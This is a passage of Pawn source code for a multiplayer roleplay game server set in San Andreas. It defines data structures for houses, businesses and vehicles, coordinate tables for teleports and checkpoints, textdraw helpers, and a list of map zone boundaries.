	casinoPrice,
	casinoBank
}

enum CREATE_HOUSE_DATA
{
	chouseHint,
	chousePrice
}

enum HOUSE_DATA
{
	houseID,
	houseClass,
	houseApartmentCount,
	housePrice,
	houseHint,
	houseImprove[5],
	houseGun[9],
	houseSkin[4],
	houseSafeCode,
	houseSafeMoney,
	houseDrugs,
	houseProducts,
	houseClose,
	Float:houseX,
	Float:houseY,
	Float:houseZ,
	Float:houseR,
	Float:houseParkX,
	Float:houseParkY,
	Float:houseParkZ,
	Float:houseParkR,
	houseOwnerID,
	houseOwner[MAX_PLAYER_NAME],
	houseHabitID[3],
	houseDay
}

enum HINT_DATA
{
	hintID,
	Float:hintX,
	Float:hintY,
	Float:hintZ,
	Float:hintR,
	Float:hintSX,
	Float:hintSY,
	Float:hintSZ,
	Float:hintSR,
	hintInterior,
	hintDescription[55]
}

enum VGUN_DATA
{
	vGunVid,
	vGunArea,
	vGunGunAmount,
	vGunAmmo,
	Text3D:vGunText,
	bool:vGunLoading,
	bool:vGunUnloading,
	vGunPickup
}

enum BINT_DATA
{
	bintID,
	bintInterior,
	Float:bintX,
	Float:bintY,
	Float:bintZ,
	Float:bintR,
	Float:bintXB,
	Float:bintYB,
	Float:bintZB,
	bintName[32]
}

enum ADVERT_DATA
{
	adSender[24],
	adCheker[24],
	adPhone,
	adText[100],
	adMoney,
	bool:adCheked,
	bool:adBusy,
	bool:adCheking
}

enum BUSINESS_DATA
{
	busiID,
	busiName[64],
	busiType, //1-прод магаз, 2-закусн, 3 - 24/7, 4-бар, 5-клуб, 6-спортзал
	busiBint,
	busiOwnerID,
	busiSellPrice,
	busiBank,
	busiPrice,
	busiProduct,
	busiStatus,
	Float:busiX,
	Float:busiY,
	Float:busiZ,
	Float:busiR,
	busiOrder,
	busiDeliving,
	busiDelivingArea,
	busiMafia,
	busiOwner[48],
}

enum CALL_DATA
{
	g_caller,
	g_callee
}

forward OnPlayerJoin(playerid);
forward WoodLoaded(playerid);
forward AbleToSelectCar(playerid);
forward GunReady(playerid);
forward GunReady2(playerid);
forward MainTimer();
forward PlayerPlaySoundDelay(playerid,soundid);
forward MinuteTimer();

new Float:RandomSpawns[2][4] =
{
	{487.2868,-1640.3427,23.7031},
	{487.2868,-1640.3427,23.7031}
};

new Float:gMafiaCP[7][3] = {
 	{-2180.1880,602.8218,35.1691},
	{-1939.3353,1227.4656,31.6477},
	{-2192.7322,647.4235,49.4375},
	{-146.7483,1236.6061,19.8992},
	{2799.4006,2019.2217,10.8113},
	{2213.4011,1433.0685,11.0547},
	{1373.8397,1019.8945,10.8203}
};

new Float:gMafiaCP2[7][3] = {
 	{2049.2922,2761.9536,10.8203},
	{2064.5251,732.2875,11.4683},
	{-227.4629,2710.0410,62.9843},
	{-1519.3655,2609.2021,55.8359},
	{-2436.9043,2351.5542,4.9688},
	{-2841.5681,921.4176,44.0547},
	{-2618.0405,-134.6827,4.3359}
};

enum pMafia
{
	pOffMafia,
	pOffMafiaid,
 	Float:hX,
	Float:hY,
	Float:hZ
};
new pMafias[MAX_PLAYERS][pMafia];
enum Ganginfa1
{
	capture,
	score,
	captureid,
	gangnumber
}
new GangInfoD[20][Ganginfa1];
new XDrawI1, XDrawI2;
new PokasGZ;
new MafiaNapad = 0;
new MafiaID = 0;
new IsStrela = 0;
new gNapadMafia = 0;
new	gSecury = 0;

new Text:Box;
new Text:Digit1[6];
new Text:Digit2[6];
new Text:Digit3[6];
new Slots[MAX_PLAYERS][3];
new SlotCounter[MAX_PLAYERS];
new Gambling[MAX_PLAYERS];
new SlotTimer[MAX_PLAYERS];
new Bet[MAX_PLAYERS];
new Balance[MAX_PLAYERS];

new WeddingTwo[MAX_PLAYERS];
new Float:GMHP[MAX_PLAYERS][2], Float:VEHHP[MAX_PLAYERS][2];

// Закусочные / Бары
new gEateryCosts[] = {1, 2, 3, 4};
new gBarCosts[] = {1, 2, 3, 4, 1};
new gEateryObj[] = {2215, 2354, 2220, 1546};
new gBarNames[][] = {{"Beer"}, {"Vodka"}, {"Brandy"}, {"Wine"}, {"Shawarma"}};
new gEateryNames[][] = {{"Burger"}, {"Salad"}, {"Pizza"}, {"Sprunk"}};

new pData[MAX_PLAYERS][PDATA];
new pTemp[MAX_PLAYERS][PTEMP];
new pRegData[MAX_PLAYERS][6][64];
new gAreas[ARs];
new bool:WeaponInfo[MAX_PLAYERS][47];
new gGuns[MAX_PLAYERS][13];
new gAmmos[MAX_PLAYERS][13];
new Float:gSeloCP[5][3] = {
	{-38.4844,-183.0430,928.7820},
	{-33.0433,-175.2912,928.7820},
	{-43.9650,-168.6770,928.7820},
	{-32.8986,-160.1485,928.7820},
	{-43.6799,-160.1498,928.7820}
};
new Float:gWoodCPs[8][3] = {
 	{68.0259,-277.9894,954.9484},
	{68.0230,-280.4664,954.9484},
	{67.5236,-283.2029,954.9484},
	{67.5216,-285.5024,954.9484},
	{54.5534,-290.3943,954.9484},
	{54.4841,-280.3293,954.9484},
	{54.4858,-277.8628,954.9484},
	{65.1637,-322.2777,954.9484}
};
new Float:gZavodCPs[3][3] = {
 	{2129.7332,-1966.4708,14.0469},
	{2135.1982,-1966.2657,14.0391},
	{2143.2180,-1972.7935,13.5469}
};
new PlayerText:gVehInfo[MAX_PLAYERS];
new PlayerText:gUpdateInfo[3][MAX_PLAYERS];
new gJobNames[5][32] = {"Avtobusis Mdzgoli","Treileris Mdzgoli","Taxisti","Meqaniki","Produqtori"};
new Text:gText[3];
new gCurHour;
new gCurDay;
new gBarrier[11];
new gBarrierButton[7];
new gVehicleDriver[MAX_VEHICLES];
new gVehicles[MAX_VEHICLES][VEHICLE_DATA];
new gTransport[220][TRANSPORT_DATA];
new gVehicleGun[MAX_VEHICLES][VGUN_DATA];
new gCalls[MAX_PLAYERS][CALL_DATA];
// New TextDraw
new Text:byme1;
new Text:byme2;
new Text:byme3;

new CaptureOn[MAX_PLAYERS];

new gGangRespawnCar;
new IDVEH[MAX_PLAYERS];
new bool:UseEnter[MAX_PLAYERS];

//Телепорты
new Float:gTeleports[TELEPORTS_COUNT][2][4] =
{
	{ //Завод
		{-86.3511,-299.3628,2.7646,6.6875},
		{50.6759,-318.6751,954.9484,86.4804} //1
	},
	{ //Универ
		{1382.1483,-1088.7728,28.2118,340.3020}, //2
		{-79.9102,0.3734,1151.1399,354.6664}
	},
	{ //Инструкторы
		{606.5971,-1459.5380,14.3969,0.0}, //3
		{1201.6191,-139.8551,922.4449,180.0}
	},
	{ //Инструкторы 2
		{-2029.8129,-120.7440,35.1719,180.0}, //4
		{1197.6005859,1336.1650391,1501.6559,0.0}
	},
	{// Больница LS
		{1172.0792,-1323.3489,15.4030,180.0}, //5
		{117.6084,-234.7047,922.9600,0.0}
	},
	{// Больница SF
		{-2655.1638,639.8657,14.4545,180.0}, //6
		{117.6084,-234.7047,922.9600,0.0}
	},
	{// Больница LV
  		{1583.5775,1769.1208,10.8203,90.0}, //7
		{117.6084,-234.7047,922.9600,0.0}
	},
	{//Банк
		{1419.1680,-1623.8611,13.5469,180.0}, //8
		{155.5532,-1202.3456,2821.4829,270.0}
	},
	{//Мэрия
		{1481.0823,-1771.9917,18.7958,0.0}, //9
		{-32.8039,-97.3979,1124.6859,90.0}
	},
	{//ВСН
		{294.8133,1830.4604,17.9847,270.0}, //10
		{279.0079,1833.1412,18.0874,0.0}
	},
	{//ВСН
		{117.4917,1934.0159,19.3108,90.0}, //11
		{124.2144,1949.3051,19.6839,270.0}
	},
	{//ВСН казарма
		{177.1358,1843.3234,17.6406,0.7950}, //12
		{411.1801, 2524.2222, 1123.0859,270.0}
	},
	{//ВСН аммо
		{374.7510,1975.3538,24.9156,0.0}, //13
		{316.3444,-170.2945,999.5938,0.0}
	},
	{//ВСН подвал
		{438.5303, 2534.2466, 1123.0859,180.0}, //14
		{426.7054, 2546.1177, 5.1375,90.0}
	},
	{//ВВС казарма
		{410.1789, 2546.0964, 16.4263,90.0}, //15
		{411.1801, 2524.2222, 1123.0859,270.0}
	},
	{//ВВС аммо
		{242.1775,2434.6218,17.0449,270.0}, //16
		{316.3444,-170.2945,999.5938,0.0}
	},
	{//ВВС подвал
		{438.5303, 2534.2466, 1123.0859,180.0}, //17
		{426.7054, 2546.1177, 5.1375,90.0}
	},
	{//LSPD_1
		{1555.3967,-1675.4686,16.1953,90.0}, //18
		{229.8422,-385.6384,1000.5192,90.0}
	},
	{//LSPD_2
		{1568.6974,-1690.0916,6.2188,180.0}, //19
		{204.4304,-380.0321,1000.5192,94.0520}
	},
	{//LSPD_Ammo
		{1524.5883,-1677.8153,6.2188,270.0}, //20
		{316.3444,-170.2945,999.5938,0.0}
	},
 {//SFPD_1
		{-1605.3414,710.7410,13.8672,0.0}, //21
		{229.8422,-385.6384,1000.5192,90.0}
	},
	{//SFPD_2
		{-1594.1053,716.3295,-4.9063,270.0}, //22
		{204.4304,-380.0321,1000.5192,94.0520}
	},
	{//SFPD_Ammo
		{-1606.1926,672.1654,-4.9063,0.0}, //23
		{316.3444,-170.2945,999.5938,0.0}
	},
	{//LVPD_1
		{2286.9355,2432.2620,10.8203,180.0}, //24
		{229.8422,-385.6384,1000.5192,90.0}
	},
	{//LVPD_2
		{2296.9907,2451.7041,10.8203,90.0}, //25
		{204.4304,-380.0321,1000.5192,94.0520}
	},
	{//LVPD_Ammo
		{2297.0117,2468.6592,10.8203,90.0}, //26
		{316.3444,-170.2945,999.5938,0.0}
	},
	{//News Network
		{914.2856,-1004.6304,37.9794,0.0}, //27
		{14.8647,-90.1865,1248.4529,0.0}
	},
	{//Мэрия 2-й вход
		{-79.2740,-79.4516,1128.0669,9.7877}, //28
		{-79.3173,-80.3639,1128.0669,359.3026}
	},
	{//Наркопритон
		{2166.0068,-1671.3362,15.0734,270.0},
		{318.6952,1114.5037,1083.8828,90.0}
	},
	{//ФБР
		{-1971.6426,-1019.4196,32.1719,270.0},
		{-63.3204,-79.5607,1087.2069,90.0}
	},
	{//Yakuza
		{2633.9531,1824.0597,11.0161,93.8092},
		{2530.1331,-1304.5524,1048.2891,271.0616}
	},
	{//Mexico
		{1457.0619,2773.2126,10.8203,270.5404},
		{2530.1331,-1304.5524,1048.2891,271.0616}
	},
	{//Colubia
		{937.9298,1733.1429,8.8516,270.3954},
		{2530.1331,-1304.5524,1048.2891,271.0616}
	},
	{//Магазин оружия
		{1368.9360,-1279.7216,13.5469,270.3954},
		{-2.7038,381.0500,1043.7756,271.0616}
	},
	{//Военкомат
		{937.9644,-1735.8070,13.5546,270.3954},
		{-9.5394,-71.0979,1074.2780,271.0616}
	},
	{//Тюрьма. ОСНОВНОЙ ВХОД
		{-318.2453,-276.3711,1082.7289,270.3954},
		{3442.7275,-678.7072,11.3939,271.0616}
	},
	{//Тюрьма, качалка
		{-314.6857,-279.5663,1082.7289,270.3954},
		{-315.1833,-280.4517,1082.7289,271.0616}
	},
	{//CASINO
		{2163.6724,2060.5046,10.8203,270.3954},
		{1133.1599,-15.8321,1000.6797,271.0616}
	},
	{//Тюрьма, столовая
		{-314.9398,-255.0305,1082.7289,270.3954},
		{-314.1936,-244.4956,1082.7289,271.0616}
	},
	{//Тюрьма 2
		{965.3663,2107.9358,1011.0303,270.3954},
		{1797.4567,-1579.0215,14.0861,271.0616}
	},
	{//ОТЕЛЬ ЛС
		{325.0884,-1515.3992,36.0325,270.3954},
		{1726.8673,-1637.9847,20.2230,271.0616}
	},
	{//ОТЕЛЬ СФ
		{-2463.4446,131.7308,35.1719,270.3954},
		{1726.8673,-1637.9847,20.2230,271.0616}
	},
	{//ОТЕЛЬ ЛВ
		{2628.0029,2349.3127,10.8203,270.3954},
		{1726.8673,-1637.9847,20.2230,271.0616}
	},
	{//Швейная фабрика
		{1227.8615,181.5498,20.4099,270.3954},
		{-61.0796,-171.3890,928.7820,271.0616}
	},
	{//ТИР ЛС
		{875.805541,-1565.014892,13.533462,270.3954},
		{300.3600,-26.7624,1001.5156,271.0616}
	},
	{//ТИР СФ
		{-2163.0466,129.2800,35.3203,270.3954},
		{300.3600,-26.7624,1001.5156,271.0616}
	},
	{//АВТОШКОЛА, ЛИФТ В ВЕРХ
		{606.6257,-1444.6869,14.1487,270.3954},
		{600.7093,-1446.2351,80.1563,271.0616}
	},
	{//ФБР, КРЫША
		{-69.3861,-42.1960,1089.6322,270.3954},
		{-1960.2201,-1039.7876,53.3498,271.0616}
	}
};
new gTeleportData[TELEPORTS_COUNT][2][2] = // вирт. мир, интерьер.
{
	{//Цех оружия
		{0,0},
		{1,1}
	},
	{//Универ
		{0,0},
		{1,1}
	},
	{//Инструкторы
		{0,0},
		{1,0}
	},
	{ //Инструкторы 2
		{0,0},
		{1,0}
	},
	{//Больница LS
		{0,0},
		{1,1}
	},
	{//Больница SF
		{0,0},
		{2,1}
	},
	{//Больница LV
		{0,0},
		{3,1}
	},
	{//Банк
		{0,0},
		{0,0   }
	},
	{//Мэрия
		{0,0},
		{1,0}
	},
	{//ВСН
		{0,0},
		{0,0}
	},
	{//ВВС
		{0,0},
		{0,0}
	},
	{//ВСН Казарма
		{0,0},
		{1,0}
	},
	{//ВСН аммо
		{0,0},
		{1,6}
	},
	{//ВСН подвал
		{1,0},
		{1,0}
	},
	{//ВВС Казарма
		{0,0},
		{0,0}
	},
	{//ВВС аммо
		{0,0},
		{0,6}
	},
	{//ВВС подвал
		{0,0},
		{0,0}
	},
	{//LSPD_1
		{0,0},
		{1,1}
	},
	{//LSPD_2
		{0,0},
		{1,1}
	},
	{//LSPD_Ammo
		{0,0},
		{2,6}
	},
 {//SFPD_1
		{0,0},
		{2,1}
	},
	{//SFPD_2
		{0,0},
		{2,1}
	},
	{//SFPD_Ammo
		{0,0},
		{3,6}
	},
	{//LVPD_1
		{0,0},
		{3,1}
	},
	{//LVPD_2
		{0,0},
		{3,1}
	},
	{//LVPD_Ammo
		{0,0},
		{4,6}
	},
	{//News Network
		{0,0},
		{1,1}
	},
	{//Мэрия 2
		{1,0},
		{1,0}
	},
	{//Наркопритон
	    {0,0},
	    {0,5}
	},
	{//ФБР
	    {0,0},
	    {1,0}
	},
	{//Yakuza
	    {0,0},
	    {2,2}
	},
	{//Yakuza
	    {0,0},
	    {3,2}
	},
	{//Yakuza
	    {0,0},
	    {4,2}
	},
	{//Магазин оружия
	    {0,0},
	    {6,0}
	},
	{//Военкомат
	    {0,0},
	    {0,6}
	},
	{//Тюрьма, ОСНОВНОЙ ВХОД
	    {2,2},
	    {2,2}
	},
	{//Тюрьма, качалка
	    {1,1},
	    {1,1}
	},
	{//CASINO
	    {0,0},
	    {1,12}
 	},
 	{//Тюрьма, столовая
	    {1,1},
	    {1,1}
	},
	{//Тюрьма 2
	    {1,1},
	    {0,0}
	},
	{//1
	    {0,0},
	    {1,18}
 	},
 	{//2
	    {0,0},
	    {2,18}
	},
	{//3
	    {0,0},
	    {3,18}
	},
	{//Швейная фабрика
	    {0,0},
	    {1,1}
 	},
 	{//ТИР
	    {0,0},
	    {0,1}
	},
	{//ТИР СФ
	    {0,0},
	    {1,1}
	},
	{//АВТОШКОЛА, ЛИФТ В ВЕРХ
	    {0,0},
	    {0,0}
	},
	{//ФБР, КРЫША
	    {1,0},
	    {0,0}
	}
};
new gTeleportAreas[TELEPORTS_COUNT][2];

Text:CreateSprite(Float:X,Float:Y,Nameb[],Float:Width,Float:Height)
{
	new Text:RetSprite;
	RetSprite = TextDrawCreate(X, Y, Nameb);
	TextDrawFont(RetSprite, 4);
	TextDrawColor(RetSprite,0xFFFFFFFF);
	TextDrawTextSize(RetSprite,Width,Height);
	return RetSprite;
}
Text:CreateBox(Float:X,Float:Y,Float:Width,Float:Height,color)
{
	new Text[500];
	for(new i=floatround(Y); i < floatround(Y+Height);i++) {
		strcat(Text,"~n~_");
	}
    new Text:RetSprite;
	RetSprite = TextDrawCreate(X, Y, Text);
	TextDrawFont(RetSprite, 0);
	TextDrawColor(RetSprite,0xFFFFFFFF);
	TextDrawTextSize(RetSprite,Width+X,Height+Y);
	TextDrawUseBox(RetSprite,1);
	TextDrawBoxColor(RetSprite,color);
	TextDrawLetterSize(RetSprite,0.0001,0.1158);
	return RetSprite;
}

//Авто
new aTaxi[2];
new aMech[2];
new aInstructor[2];
new aHospital[3][2];
new aGang[5][5];
new aArmy1[2];
new aArmy2[2];
new aLSPD[2];
new aSFPD[2];
new aLVPD[2];
new aNews[2];
new aFbi[2];
new aYakuza[2];
new aMexico[2];
new aColomb[2];
new aMer[2];
new aHotel[3][2];
//new aSanta;

enum SAZONE_MAIN
{
	SAZONE_NAME[32],
	Float:SAZONE_AREA[6]
};
new gZoneInfo[][SAZONE_MAIN] =
{
	{"The Big Ear",	                {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
	{"Aldea Malvada",               {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
	{"Angel Pine",                  {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
	{"Arco del Oeste",              {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
	{"Avispa Country Club",         {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
	{"Avispa Country Club",         {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
	{"Avispa Country Club",         {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
	{"Avispa Country Club",         {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
	{"Avispa Country Club",         {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
	{"Avispa Country Club",         {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
	{"Back o Beyond",               {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
	{"Battery Point",               {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
	{"Bayside",                     {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
	{"Bayside Marina",              {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
	{"Beacon Hill",                 {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
	{"Blackfield",                  {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
	{"Blackfield",                  {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
	{"Blackfield Chapel",           {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
	{"Blackfield Chapel",           {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
	{"Blackfield Intersection",     {1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
	{"Blackfield Intersection",     {1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
	{"Blackfield Intersection",     {1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
	{"Blackfield Intersection",     {1375.60,823.20,-89.00,1457.30,919.40,110.90}},
	{"Blueberry",                   {104.50,-220.10,2.30,349.60,152.20,200.00}},
	{"Blueberry",                   {19.60,-404.10,3.80,349.60,-220.10,200.00}},
	{"Blueberry Acres",             {-319.60,-220.10,0.00,104.50,293.30,200.00}},
	{"Caligula's Palace",           {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
	{"Caligula's Palace",           {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
	{"Calton Heights",              {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
	{"Chinatown",                   {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
	{"City Hall",                   {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
	{"Come-A-Lot",                  {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
	{"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
	{"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
	{"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
	{"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
	{"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
	{"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
	{"Conference Center",           {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
	{"Conference Center",           {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
	{"Cranberry Station",           {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
	{"Creek",                       {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
	{"Dillimore",                   {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
	{"Doherty",                     {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
	{"Doherty",                     {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
	{"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
	{"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
	{"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
	{"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
	{"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
	{"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
	{"Downtown Los Santos",         {1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
	{"Downtown Los Santos",         {1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
	{"Downtown Los Santos",         {1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
	{"Downtown Los Santos",         {1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
	{"Downtown Los Santos",         {1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
	{"Downtown Los Santos",         {1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
	{"Downtown Los Santos",         {1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
	{"Downtown Los Santos",         {1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
	{"Downtown Los Santos",         {1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
	{"East Beach",                  {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
	{"East Beach",                  {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
	{"East Beach",                  {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
	{"East Beach",                  {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
	{"East Los Santos",             {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
	{"East Los Santos",             {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
	{"East Los Santos",             {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
	{"East Los Santos",             {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
	{"East Los Santos",             {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
	{"East Los Santos",             {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
	{"East Los Santos",             {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
	{"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
	{"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
	{"Easter Bay Airport",          {-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
	{"Easter Bay Airport",          {-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
	{"Easter Bay Airport",          {-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
	{"Easter Bay Airport",          {-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
	{"Easter Bay Chemicals",        {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
	{"Easter Bay Chemicals",        {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
	{"El Castillo del Diablo",      {-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
	{"El Castillo del Diablo",      {-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
	{"El Castillo del Diablo",      {-208.50,2337.10,0.00,8.40,2487.10,200.00}},
	{"El Corona",                   {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
	{"El Corona",                   {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
	{"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
	{"Esplanade East",              {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
	{"Esplanade East",              {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
	{"Esplanade East",              {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
	{"Esplanade North",             {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
	{"Esplanade North",             {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
	{"Esplanade North",             {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
	{"Fallen Tree",                 {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
	{"Fallow Bridge",               {434.30,366.50,0.00,603.00,555.60,200.00}},
	{"Fern Ridge",                  {508.10,-139.20,0.00,1306.60,119.50,200.00}},
	{"Financial",                   {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
	{"Fisher's Lagoon",             {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
	{"Flint Intersection",          {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
	{"Flint Range",                 {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
	{"Fort Carson",                 {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
	{"Foster Valley",               {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
	{"Foster Valley",               {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
	{"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
	{"Gant Bridge",                 {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
	{"Gant Bridge",                 {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
	{"Ganton",                      {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
	{"Ganton",                      {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
	{"Garcia",                      {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
	{"Garcia",                      {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
	{"Garver Bridge",               {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
	{"Garver Bridge",               {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
	{"Garver Bridge",               {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
	{"Glen Park",                   {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
	{"Glen Park",                   {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
	{"Glen Park",                   {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
	{"Green Palms",                 {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
	{"Greenglass College",          {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
	{"Greenglass College",          {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
	{"Hampton Barns",               {603.00,264.30,0.00,761.90,366.50,200.00}},
	{"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
	{"Harry Gold Parkway",          {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
	{"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
	{"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
	{"Hunter Quarry",               {337.20,710.80,-115.20,860.50,1031.70,203.70}},
	{"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
	{"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
	{"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
	{"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
	{"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
	{"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
	{"Jefferson",                   {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
	{"Jefferson",                   {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
	{"Jefferson",                   {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
	{"Jefferson",                   {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
	{"Jefferson",                   {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
	{"Jefferson",                   {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
	{"Julius Thruway East",         {2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
	{"Julius Thruway East",         {2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
	{"Julius Thruway East",         {2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
	{"Julius Thruway East",         {2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
	{"Julius Thruway North",        {2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
	{"Julius Thruway North",        {2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
	{"Julius Thruway North",        {2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
